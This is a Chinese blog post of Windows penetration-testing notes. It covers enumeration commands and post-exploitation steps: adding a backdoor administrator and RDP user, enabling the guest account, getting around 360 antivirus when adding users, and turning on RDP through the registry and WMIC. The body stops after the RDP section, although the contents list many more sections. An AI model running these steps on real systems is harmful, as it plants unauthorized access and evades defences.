<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="Windows信息收集&amp;命令小tips枚举:WinPEAS.batWinPEAS 提权建议利用脚本：  Sherlock-Powershell  Watson  Windows-Exploit-Suggester   钓鱼[[钓鱼攻击学习]] 用户信息当前用户12345whoami  whoami &#x2F;user  whoami &#x2F;priv # 查看权限（务必  whoami &#x2F;groups">
<meta property="og:type" content="article">
<meta property="og:title" content="Windows提权方式">
<meta property="og:url" content="https://atsud0.me/2020/04/Windows%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/index.html">
<meta property="og:site_name" content="雪之下二丁目鹤岗八幡宫">
<meta property="og:description" content="Windows信息收集&amp;命令小tips枚举:WinPEAS.batWinPEAS 提权建议利用脚本：  Sherlock-Powershell  Watson  Windows-Exploit-Suggester   钓鱼[[钓鱼攻击学习]] 用户信息当前用户12345whoami  whoami &#x2F;user  whoami &#x2F;priv # 查看权限（务必  whoami &#x2F;groups">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://images.atsud0.me/images/post/20210805-13:05:42-_pEruNV_zOtAup_pEruNV_1628139942161_pEruNV_zOtAup.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20210805-13:33:21-_DK7iCY_xuoEbv_DK7iCY_1628141601180_DK7iCY_xuoEbv.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20210805-13:34:57-_bmz4Iw_SbHQXQ_bmz4Iw_1628141697712_bmz4Iw_SbHQXQ.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20210414-22:20:55-_4Eh8MO_4Eh8MO_4Eh8MO_rkxKwp.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20210414-22:29:55-_310uAN_310uAN_310uAN_5wFXj2.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20210414-22:32:29-_ivldNy_ivldNy_ivldNy_SAyhjF.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20210805-11:25:45-_dXNG1g_jAQ3eK_dXNG1g_1628133945802_dXNG1g_jAQ3eK.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20210805-11:26:58-_Ds7nP1_17YLXM_Ds7nP1_1628134018310_Ds7nP1_17YLXM.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20210805-11:30:26-_JnVySd_bbirw2_JnVySd_1628134226311_JnVySd_bbirw2.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200621_113603.jpg">
<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201221103449109.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201221103702235.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201221103742986.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/mtrLoXe.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201025143232175.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201025143254201.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201101225944092.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201101230108859.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201101230322426.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201025203314897.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201025203429940.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201025203441323.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201025203530071.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201025203647522.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201025203637300.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201101231542545.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201025213738505.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201025222233610.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20210802-21:52:04-_r1d5eO_image-20210802215203833_r1d5eO_1627912324403_r1d5eO_image-20210802215203833.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20210802-22:29:23-_R0xnFw_image-20210802222923221_R0xnFw_1627914563542_R0xnFw_image-20210802222923221.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201102164443074.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200623_092853.jpg">
<meta property="og:image" content="https://images.atsud0.me/images/post/20210805-16:16:15-_QShZWi_RTiAtc_QShZWi_1628151375257_QShZWi_RTiAtc.png">
<meta property="article:published_time" content="2020-04-14T04:41:08.000Z">
<meta property="article:modified_time" content="2024-01-08T20:32:30.080Z">
<meta property="article:author" content="atsud0">
<meta property="article:tag" content="Windows">
<meta property="article:tag" content="PowerShell">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://images.atsud0.me/images/post/20210805-13:05:42-_pEruNV_zOtAup_pEruNV_1628139942161_pEruNV_zOtAup.png">
    
    
      
        
          
            <link rel="shortcut icon" href="https://www.gravatar.com/avatar/833e6979e17dd10aebe34f34c0fd5f7d?s=48">
          
        
      
      
        
          
            <link rel="icon" type="image/png" href="https://www.gravatar.com/avatar/833e6979e17dd10aebe34f34c0fd5f7d?s=192" sizes="192x192">
          
        
      
      
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="https://www.gravatar.com/avatar/833e6979e17dd10aebe34f34c0fd5f7d?s=180">
          
        
      
    
    <!-- title -->
    <title>Windows提权方式</title>
    <!-- async scripts -->
    <!-- Google Analytics -->

  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-163969429-1"></script>
  <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
      gtag('config', 'UA-163969429-1');
  </script>


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
      <link rel="alternate" href="/true" title="雪之下二丁目鹤岗八幡宫" type="application/atom+xml" />
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/links/">Friends</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/atsud0">Github</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2020/04/Linux%E9%83%A8%E5%88%86%E5%AE%9E%E7%94%A8%E5%91%BD%E4%BB%A4/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2020/04/Linux%E6%8F%90%E6%9D%83/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://atsud0.me/2020/04/Windows%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://atsud0.me/2020/04/Windows%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/&text=Windows提权方式"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://atsud0.me/2020/04/Windows%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/&title=Windows提权方式"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Windows提权方式&body=Check out this article: https://atsud0.me/2020/04/Windows%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://atsud0.me/2020/04/Windows%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/&title=Windows提权方式"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://atsud0.me/2020/04/Windows%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/&name=Windows提权方式&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://atsud0.me/2020/04/Windows%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/&t=Windows提权方式"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Windows%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-amp-%E5%91%BD%E4%BB%A4%E5%B0%8Ftips"><span class="toc-number">1.</span> <span class="toc-text">Windows信息收集&amp;命令小tips</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%92%93%E9%B1%BC"><span class="toc-number">1.1.</span> <span class="toc-text">钓鱼</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF"><span class="toc-number">1.2.</span> <span class="toc-text">用户信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF"><span class="toc-number">1.3.</span> <span class="toc-text">网络信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E4%BF%A1%E6%81%AF"><span class="toc-number">1.4.</span> <span class="toc-text">服务信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F"><span class="toc-number">1.5.</span> <span class="toc-text">应用程序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E8%BF%9B%E7%A8%8B%E4%BF%A1%E6%81%AF"><span class="toc-number">1.6.</span> <span class="toc-text">系统进程信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF"><span class="toc-number">1.7.</span> <span class="toc-text">系统信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A3%80%E7%B4%A2%E6%96%87%E4%BB%B6"><span class="toc-number">1.8.</span> <span class="toc-text">检索文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A3%81%E7%9B%98%E4%BF%A1%E6%81%AF"><span class="toc-number">1.9.</span> <span class="toc-text">磁盘信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%96%B9%E9%A9%B1%E5%8A%A8"><span class="toc-number">1.10.</span> <span class="toc-text">第三方驱动</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%85%B3%E9%94%AE%E5%AD%97%E6%90%9C%E7%B4%A2"><span class="toc-number">1.11.</span> <span class="toc-text">注册表关键字搜索</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E6%9F%A5%E8%AF%A2"><span class="toc-number">1.12.</span> <span class="toc-text">文件权限查询</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1"><span class="toc-number">1.13.</span> <span class="toc-text">定时任务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C"><span class="toc-number">1.14.</span> <span class="toc-text">下载文件操作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%9F%E6%88%90shell-MSF"><span class="toc-number">1.15.</span> <span class="toc-text">生成shell-MSF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Powershell-%E7%9B%B8%E5%85%B3"><span class="toc-number">1.16.</span> <span class="toc-text">Powershell 相关</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C"><span class="toc-number">2.</span> <span class="toc-text">提权相关操作</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows-Exploit-Suggester"><span class="toc-number">2.1.</span> <span class="toc-text">Windows-Exploit-Suggester</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RUNAS-%E6%8F%90%E9%AB%98%E6%9D%83%E9%99%90%E8%BF%90%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">2.2.</span> <span class="toc-text">RUNAS 提高权限运行命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E5%AE%89%E8%A3%85%E6%8F%90%E6%9D%83"><span class="toc-number">2.3.</span> <span class="toc-text">无人值守安装提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8"><span class="toc-number">2.4.</span> <span class="toc-text">服务程序利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90"><span class="toc-number">2.5.</span> <span class="toc-text">不安全的服务权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8E%A7%E5%88%B6%E7%AD%96%E7%95%A5-AppLocker"><span class="toc-number">2.6.</span> <span class="toc-text">绕过应用程序控制策略(AppLocker)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%8F%90%E6%9D%83"><span class="toc-number">2.7.</span> <span class="toc-text">注册表提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#UAC%E7%BB%95%E8%BF%87"><span class="toc-number">2.8.</span> <span class="toc-text">UAC绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DLL%E5%8A%AB%E6%8C%81"><span class="toc-number">2.9.</span> <span class="toc-text">DLL劫持</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83"><span class="toc-number">2.10.</span> <span class="toc-text">系统漏洞提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96"><span class="toc-number">2.11.</span> <span class="toc-text">令牌窃取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql-%E6%8F%90%E6%9D%83"><span class="toc-number">2.12.</span> <span class="toc-text">mysql 提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pr-%E6%8F%90%E6%9D%83"><span class="toc-number">2.13.</span> <span class="toc-text">pr 提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BB%A5%E7%94%A8%E6%A8%A1%E6%8B%9F%E7%89%B9%E6%9D%83"><span class="toc-number">2.14.</span> <span class="toc-text">滥用模拟特权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows-%E7%AC%AC%E4%B8%89%E6%96%B9%E9%A9%B1%E5%8A%A8%E6%8F%90%E6%9D%83"><span class="toc-number">2.15.</span> <span class="toc-text">Windows 第三方驱动提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BB%A5%E7%94%A8LAPS%E7%BB%84%E7%94%A8%E6%88%B7%E6%8F%90%E6%9D%83%EF%BC%88AD%EF%BC%89"><span class="toc-number">2.16.</span> <span class="toc-text">滥用LAPS组用户提权（AD）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">2.17.</span> <span class="toc-text">Windows 横向移动</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kerberos"><span class="toc-number">2.18.</span> <span class="toc-text">Kerberos</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E6%B8%97%E9%80%8F"><span class="toc-number">2.19.</span> <span class="toc-text">后渗透</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        Windows提权方式
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">atsud0</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2020-04-14T04:41:08.000Z" class="dt-published" itemprop="datePublished">2020-04-14</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/Note/">Note</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/PowerShell/" rel="tag">PowerShell</a>, <a class="p-category" href="/tags/Windows/" rel="tag">Windows</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h1 id="Windows信息收集-amp-命令小tips"><a href="#Windows信息收集-amp-命令小tips" class="headerlink" title="Windows信息收集&amp;命令小tips"></a>Windows信息收集&amp;命令小tips</h1><p>枚举:WinPEAS.bat<a href="%5Bhttps://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASbat%5D(https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASbat)" title="" target="">WinPEAS</a></p>
<p>提权建议利用脚本：</p>
<ul>
<li><p><a target="_blank" rel="noopener" href="https://github.com/rasta-mouse/Sherlock">Sherlock-Powershell</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/rasta-mouse/Watson/tree/44bd69e7cca979f5fffb21f43d9c894857fe3714">Watson</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">Windows-Exploit-Suggester</a></p>
</li>
</ul>
<h2 id="钓鱼"><a href="#钓鱼" class="headerlink" title="钓鱼"></a>钓鱼</h2><p>[[钓鱼攻击学习]]</p>
<h2 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h2><h3 id="当前用户"><a href="#当前用户" class="headerlink" title="当前用户"></a>当前用户</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">whoami  </span><br><span class="line">whoami /user  </span><br><span class="line">whoami /priv # 查看权限（务必  </span><br><span class="line">whoami /groups #查看所属组  </span><br><span class="line">whoami /all</span><br></pre></td></tr></table></figure>

<h3 id="net查询用户信息"><a href="#net查询用户信息" class="headerlink" title="net查询用户信息"></a>net查询用户信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"># 查看所有用户</span><br><span class="line">net user</span><br><span class="line"></span><br><span class="line"># 查看某一用户的信息</span><br><span class="line">net user test</span><br><span class="line"></span><br><span class="line"># 查看管理员用户</span><br><span class="line">net localgroup administrators</span><br><span class="line"></span><br><span class="line"># 查询域管</span><br><span class="line">net group &quot;domain admins&quot; /domain</span><br><span class="line"></span><br><span class="line"># 查询域管理员用户组</span><br><span class="line">net localgroup administrators /domain</span><br><span class="line"></span><br><span class="line"># 查询域用户</span><br><span class="line">net user /domain</span><br><span class="line"></span><br><span class="line"># 域工作组</span><br><span class="line">net group /domain</span><br><span class="line"></span><br><span class="line"># 域名</span><br><span class="line">net view /domain</span><br><span class="line"></span><br><span class="line"># 域内计算机</span><br><span class="line">net view /domain:xx</span><br><span class="line"></span><br><span class="line"># 域控</span><br><span class="line">net time /domain</span><br><span class="line"></span><br><span class="line"># 查看远程终端在线的用户</span><br><span class="line">query user</span><br><span class="line">quser</span><br></pre></td></tr></table></figure>

<h3 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h3><blockquote>
<p>Windows 用户名称的构成：用户名称:RID:LM:NTLM</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">net user test 123.com /add &amp; net localgroup administrators test /add #添加一个名为test的用户，并且升级为管理员。  </span><br><span class="line">  </span><br><span class="line">net localgroup &quot;Remote Desktop Users&quot; test /add #加入远程桌面用户组  </span><br><span class="line">  </span><br><span class="line">net user guest /active:yes #激活guest用户  </span><br><span class="line">  </span><br><span class="line">net user guest 1234 # 修改guest用户的密码</span><br></pre></td></tr></table></figure>

<h4 id="Bypass360添加用户"><a href="#Bypass360添加用户" class="headerlink" title="Bypass360添加用户"></a>Bypass360添加用户</h4><p>在360安全大脑的连接的情况下，执行部分操作会被直接拦截。比如这里添加用户，<br><img src="https://images.atsud0.me/images/post/20210805-13:05:42-_pEruNV_zOtAup_pEruNV_1628139942161_pEruNV_zOtAup.png" alt="20210805-13:05:42-_pEruNV_zOtAup_pEruNV_1628139942161_pEruNV_zOtAup"></p>
<p>不过这个绕过也很简单。</p>
<p>使用<a target="_blank" rel="noopener" href="https://github.com/bopin2020/NetUser/">NetUser</a>，成功绕过。</p>
<p>原理是不使用net命令添加用户，改为使用<code>NetUserAdd</code>这个API添加普通权限的用户，<code>NetLocalGroupAddMembers</code>这个API添加管理员权限。</p>
<p><img src="https://images.atsud0.me/images/post/20210805-13:33:21-_DK7iCY_xuoEbv_DK7iCY_1628141601180_DK7iCY_xuoEbv.png" alt="20210805-13:33:21-_DK7iCY_xuoEbv_DK7iCY_1628141601180_DK7iCY_xuoEbv"></p>
<p><img src="https://images.atsud0.me/images/post/20210805-13:34:57-_bmz4Iw_SbHQXQ_bmz4Iw_1628141697712_bmz4Iw_SbHQXQ.png" alt="20210805-13:34:57-_bmz4Iw_SbHQXQ_bmz4Iw_1628141697712_bmz4Iw_SbHQXQ"></p>
<ul>
<li><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/troubleshoot/dotnet/csharp/add-user-local-system">使用目录服务和 Visual C 升在本地系统中添加用户</a></li>
</ul>
<h2 id="网络信息"><a href="#网络信息" class="headerlink" title="网络信息"></a>网络信息</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ipconfig</span> /all # 网络配置  </span><br><span class="line">route <span class="built_in">print</span> # 路由信息  </span><br><span class="line">arp -a # arp缓存表  </span><br><span class="line">netstat -ano # 查看网络连接  </span><br></pre></td></tr></table></figure>

<h3 id="防火墙规则"><a href="#防火墙规则" class="headerlink" title="防火墙规则"></a>防火墙规则</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall show config  </span><br><span class="line">netsh firewall show state</span><br></pre></td></tr></table></figure>

<h3 id="本地开放的端口"><a href="#本地开放的端口" class="headerlink" title="本地开放的端口"></a>本地开放的端口</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">netstat -an #目前开放的端口和网络联机情况  </span><br><span class="line">netstat -anp #获取PID，端口开放情况，程序和服务组件等信息  </span><br><span class="line">netstat -ano #获取TCP/UDP协议信息，端口，进程号  </span><br><span class="line">netstat -anvb #获取进程名，对应的进程pid，端口所用协议，调用的可执行组件，和路径等。  </span><br><span class="line">netstat -ano -p tcp #指定获取TCP协议信息，端口，进程号。</span><br></pre></td></tr></table></figure>

<h3 id="查询RDP服务端口"><a href="#查询RDP服务端口" class="headerlink" title="查询RDP服务端口"></a>查询RDP服务端口</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">运行 REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp/ v PortNumber 查看</span><br><span class="line"></span><br><span class="line"># 命令行查看</span><br><span class="line">tasklist /svc | <span class="built_in">find</span> &quot;TeamService&quot; #获取对应的PID</span><br><span class="line">netstat -ano | <span class="built_in">find</span> &quot;PID&quot; # 通过PID找端口</span><br></pre></td></tr></table></figure>

<h3 id="穩域控"><a href="#穩域控" class="headerlink" title="穩域控"></a>穩域控</h3> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup -type=SRV _ldap._tcp</span><br></pre></td></tr></table></figure>

<h3 id="命令行开启3389"><a href="#命令行开启3389" class="headerlink" title="命令行开启3389"></a>命令行开启3389</h3><h4 id="注册表方式"><a href="#注册表方式" class="headerlink" title="注册表方式"></a>注册表方式</h4><h5 id="Windows-XP-x2F-7"><a href="#Windows-XP-x2F-7" class="headerlink" title="Windows XP&#x2F;7"></a>Windows XP&#x2F;7</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure>

<h4 id="WMIC"><a href="#WMIC" class="headerlink" title="WMIC"></a>WMIC</h4><h5 id="Windows2003"><a href="#Windows2003" class="headerlink" title="Windows2003"></a>Windows2003</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic path win32_terminalservicesetting where (__CLASS != &quot;&quot;) call setallowtsconnections 1</span><br></pre></td></tr></table></figure>
<h5 id="Windows-Server-2008"><a href="#Windows-Server-2008" class="headerlink" title="Windows Server 2008"></a>Windows Server 2008</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS != &quot;&quot;) call setallowtsconnections 1  </span><br><span class="line">  </span><br><span class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName =&#x27;DP-Tcp&#x27;) call setuserauthenticationrequired 1  </span><br><span class="line">  </span><br><span class="line">reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure>
